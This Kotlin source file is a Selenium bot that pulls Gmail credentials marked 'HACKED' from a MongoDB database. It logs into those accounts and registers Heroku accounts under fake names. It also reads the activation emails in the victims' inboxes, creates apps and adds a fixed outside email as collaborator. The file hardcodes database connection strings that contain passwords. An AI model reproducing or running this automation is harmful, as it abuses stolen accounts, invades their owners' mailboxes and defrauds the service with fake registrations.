package net.scr0pt.thirdservice.heroku

import net.scr0pt.bot.HerokuPageResponse
import net.scr0pt.bot.Page
import net.scr0pt.bot.PageManager
import net.scr0pt.bot.PageResponse
import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import org.apache.commons.lang3.RandomStringUtils
import org.jsoup.nodes.Document
import org.openqa.selenium.WebDriver
import org.openqa.selenium.firefox.FirefoxDriver
import net.scr0pt.thirdservice.mlab.loginGoogle
import net.scr0pt.utils.FakeProfile
import net.scr0pt.utils.webdriver.Browser
import net.scr0pt.utils.webdriver.executeScript
import net.scr0pt.utils.webdriver.findElWait
import net.scr0pt.utils.webdriver.findFirstElWait
import java.util.concurrent.ThreadLocalRandom

/**
 * Created by Long
 * Date: 10/18/2019
 * Time: 9:11 PM
 */

suspend fun main() {
    val mongoClient = MongoClients.create("mongodb+srv://root:mongo@cluster0-qzu3e.mongodb.net/admin")
    val accountDatabase = mongoClient.getDatabase("edu-school-account")
    val eduCollection = accountDatabase.getCollection("vimaru-email-info")

    val mongoClient2 =
        MongoClients.create("mongodb+srv://root:mongo@cluster0-enhmy.mongodb.net/admin?retryWrites=true&w=majority")
    val herokuDatabase = mongoClient2.getDatabase("heroku")
    val herokuCollection = herokuDatabase.getCollection("heroku-account")
    while (true) {
        eduCollection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
            val gmailUsername = it.getString("email")
            val gmailPassword = it.getString("new_pass") ?: it.getString("pass")

            if (herokuCollection.countDocuments(org.bson.Document("email", gmailUsername)) > 0L) return

            val appName = "scr0pt-" + RandomStringUtils.randomAlphabetic(15).toLowerCase()
            val collaboratorEmail = "alphahoai@gmail.com"
            val result = FakeProfile.getNewProfile()
            val first = result?.name?.first ?: "Bruce"
            val last = result?.name?.last ?: "Lee"
            println(gmailUsername)
            println(first)
            println(last)
            registerHeroku(
                    gmailUsername = gmailUsername,
                    gmailPassword = gmailPassword,
                    email = gmailUsername,
                    appName = appName,
                    collaboratorEmail = collaboratorEmail,
                    password = "XinChaoVietNam@${ThreadLocalRandom.current().nextInt()}",
                    firstName = first,
                    lastName = last,
                    driver = Browser.firefox,
                    herokuCollection = herokuCollection
            )
        }
    }
}

suspend fun registerHeroku(
    email: String,
    password: String,
    firstName: String,
    lastName: String,
    appName: String,
    collaboratorEmail: String,
    driver: FirefoxDriver,
    herokuCollection: MongoCollection<org.bson.Document>,
    gmailUsername: String,
    gmailPassword: String
) {
    loginGoogle(gmailUsername, gmailPassword, driver) {
        val pageManager = PageManager(
                arrayListOf<Page>(
                        HerokuRegisterPage(firstName, lastName, email, password) {
                            herokuCollection.insertOne(
                                    org.bson.Document("email", email)
                                            .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                            .append("verify", false)
                            )
                            println("HerokuRegisterPage success")
                        },
                        HerokuRegisterDoneWaitingCheckEmailPage() {
                            println("HerokuRegisterDone_WaitingCheckEmail_Page success")
                        },
                        GoogleGmailPage() {
                            println("GoogleGmailPage success")
                        },
                        HerokuSetYourPasswordPage(password = password) {
                            herokuCollection.updateOne(
                                    org.bson.Document("email", email),
                                    Updates.set("verify", true)
                            )
                            println("HerokuSetYourPasswordPage success")
                        },
                        HerokuWelcomePage {
                            println("HerokuWelcomePage success")
                        },
                        HerokuDashboardPage {
                            println("HerokuDashboardPage success")
                        },
                        HerokuCreateNewAppPage(appName = appName) {
                            herokuCollection.updateOne(org.bson.Document("email", email), Updates.set("appName", appName))
                            println("HerokuCreateNewAppPage ${appName} success")
                        },
                        HerokuDeployPagePage {
                            println("HerokuDeployPagePage success")
                        },
                        HerokuAccessPage(collaboratorEmail = collaboratorEmail) {
                            println("HerokuAccessPage ${collaboratorEmail} success")
                        }
                ),
                driver,
                "https://signup.heroku.com"
        )
        pageManager.run { pageResponse ->
            println(pageResponse)
            if (pageResponse is HerokuPageResponse.COLLABORATOR_ADDED) {
                herokuCollection.updateOne(
                        org.bson.Document("email", email),
                        Updates.push("collaborators", collaboratorEmail)
                )
            }

            Thread.sleep(60000)
            driver.close()
            Thread.sleep(180000)
        }
    }
}

class HerokuRegisterPage(
    val firstName: String,
    val lastName: String,
    val email: String,
    val password: String,
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        println(this::class.java.simpleName + ": action")
        try {
            driver.executeScript(
                """
                    function randInt(max, min){
                        return Math.floor(Math.random() * (+max - +min + 1)) + +min;
                    }
                    var signupForm = document.querySelector("form.signup-form");
                    signupForm.first_name.value = "${firstName}";
                    signupForm.last_name.value = "${lastName}";
                    signupForm.email.value = "${email}";
                    signupForm.role.value = signupForm.role[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.self_declared_country.value = signupForm.self_declared_country[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.main_programming_language.value = signupForm.main_programming_language[randInt(1, signupForm.role.length - 1)].value;
        """.trimIndent()
            )
        } catch (e: Exception) {
        }

        val captchaBtns = driver.findElWait(1000, 60000, ".input-group.captcha iframe")

        return if (captchaBtns.isEmpty()) {
            PageResponse.NOT_FOUND_ELEMENT()
        } else {
            captchaBtns.first().click()
            PageResponse.WAITING_FOR_RESULT()
        }
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://signup.heroku.com") &&
                doc.selectFirst(".header-net.scr0pt.main h2")?.text() == "Sign up for free and experience Heroku today"
}

class HerokuRegisterDoneWaitingCheckEmailPage(
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        driver.get("https://mail.google.com/mail/u/0/?tab=wm#inbox")
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://signup.heroku.com/account") &&
                doc.selectFirst(".header-net.scr0pt.main h2") == null &&
                doc.selectFirst(".account-page .account-content h2")?.text() == "Almost there …" &&
                doc.selectFirst(".account-page .account-content h3")?.text()?.startsWith("Please check your email") == true
}

class HerokuSetYourPasswordPage(
    val password: String,
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        val passwordInputs = driver.findElWait(1000, 60000, "input#user_password")
        val passwordConfirmInputs = driver.findElWait(1000, 60000, "input#user_password_confirmation")
        val submitBtns =
            driver.findElWait(1000, 60000, "form.signup-form.confirmation-form .input-group input[type=\"submit\"]")

        if (passwordInputs.isEmpty() || passwordConfirmInputs.isEmpty() || submitBtns.isEmpty()) {
            return PageResponse.NOT_FOUND_ELEMENT()
        }

        passwordInputs.first().sendKeys(password)
        passwordConfirmInputs.first().sendKeys(password)
        submitBtns.first().click()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://signup.heroku.com/confirm") &&
                doc.selectFirst(".header-net.scr0pt.main h2") == null &&
                doc.selectFirst(".account-page .account-content h2")?.text() == "Set your password" &&
                doc.selectFirst(".account-page .account-content h3")?.text() == "Create your password and log in to your Heroku account."
}


class HerokuWelcomePage(
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        val submitBtns = driver.findElWait(1000, 60000, "form#final_login .center input[type=\"submit\"]")
        if (submitBtns.isEmpty()) {
            return PageResponse.NOT_FOUND_ELEMENT()
        }

        submitBtns.first().click()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://signup.heroku.com/account/accept/ok") &&
                doc.selectFirst(".header-net.scr0pt.main h2") == null &&
                doc.selectFirst(".account-page .account-content h2")?.text() == "Welcome to Heroku" &&
                doc.selectFirst(".account-page .account-content h3") == null &&
                doc.selectFirst("form#final_login .center input[type=\"submit\"]")?.attr("value") == "Click here to proceed"
}


class HerokuDashboardPage(
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        driver.get("https://dashboard.heroku.com/new-app")
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://dashboard.heroku.com/apps") &&
                doc.selectFirst("#ember22 .hk-button--secondary")?.text() == "New" &&
                doc.selectFirst(".header-net.scr0pt.main h2") == null &&
                doc.selectFirst(".account-page .account-content h2") == null &&
                doc.selectFirst(".account-page .account-content h3") == null &&
                doc.selectFirst("#ember21 button.context-toggle span.purple")?.text() == "Personal"
}


class HerokuCreateNewAppPage(
    val appName: String,
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {

        val newAppNameInputs = driver.findElWait(1000, 60000, "form.new-app-view .new-app-name input")
        val submitBtns =
            driver.findElWait(1000, 60000, "form.new-app-view button.create-app-button")

        if (newAppNameInputs.isEmpty() || submitBtns.isEmpty()) {
            return PageResponse.NOT_FOUND_ELEMENT()
        }

        newAppNameInputs.first().sendKeys(appName)
        submitBtns.first().click()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://dashboard.heroku.com/new-app")
}

class HerokuDeployPagePage(
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        driver.get(driver.currentUrl.substringBefore("/deploy") + "/access")
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://dashboard.heroku.com/apps/") &&
                currentUrl.contains("/deploy/heroku-git")
}

class HerokuAccessPage(
    val collaboratorEmail: String,
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun watingResult(doc: Document, currentUrl: String, title: String): PageResponse? {
        if (doc.select(".collaborator-item:contains(collaborator) td:nth-child(2)")
                ?.firstOrNull { collaboratorEmail.equals(it.text(), ignoreCase = true) } != null
        ) {
            return HerokuPageResponse.COLLABORATOR_ADDED()
        }
        return null
    }

    override fun _action(driver: WebDriver): PageResponse {
        println("addCollaboratorBtns")
        val addCollaboratorBtns =
            driver.findFirstElWait(1000, 60000, "button",jsoup = false, filter = {el -> el.text.trim().equals("Add collaborator", ignoreCase = true)})
                ?: return PageResponse.NOT_FOUND_ELEMENT()
        addCollaboratorBtns.click()
        println("passwordConfirmInputs")
        val passwordConfirmInputs = driver.findFirstElWait(1000, 60000,  "input", jsoup = false, filter =  {el -> el.getAttribute("placeholder") == "user@domain.com"})
            ?: return PageResponse.NOT_FOUND_ELEMENT()
        passwordConfirmInputs.sendKeys(collaboratorEmail)
        println("saveChangesBtns")
        val saveChangesBtns =
            driver.findFirstElWait(1000, 60000, "button", jsoup = false, filter = {el -> el.text.trim().equals("Save changes", ignoreCase = true)})
                ?: return PageResponse.NOT_FOUND_ELEMENT()
        saveChangesBtns.click()
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://dashboard.heroku.com/apps/") &&
                currentUrl.contains("/access")
}


class GoogleGmailPage(
    onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun isEndPage() = false

    override fun _action(driver: WebDriver): PageResponse {
        val link =
            driver.pageSource.substringAfter("Thanks for signing up with Heroku! You must follow this link to activate your account: ")
                ?.substringBefore("Have fun")?.trim()
        if (link.startsWith("https://id.heroku.com/account/accept/")) {
            driver.get(link)
        }
        return PageResponse.WAITING_FOR_RESULT()
    }

    override fun _detect(doc: Document, currentUrl: String, title: String): Boolean =
        currentUrl.startsWith("https://mail.google.com/mail/") &&
                doc.html().contains("Thanks for signing up with Heroku! You must follow this link to activate your account") &&
                doc.html().contains("https://id.heroku.com/account/accept/") &&
                doc.html().contains("Have fun")
}
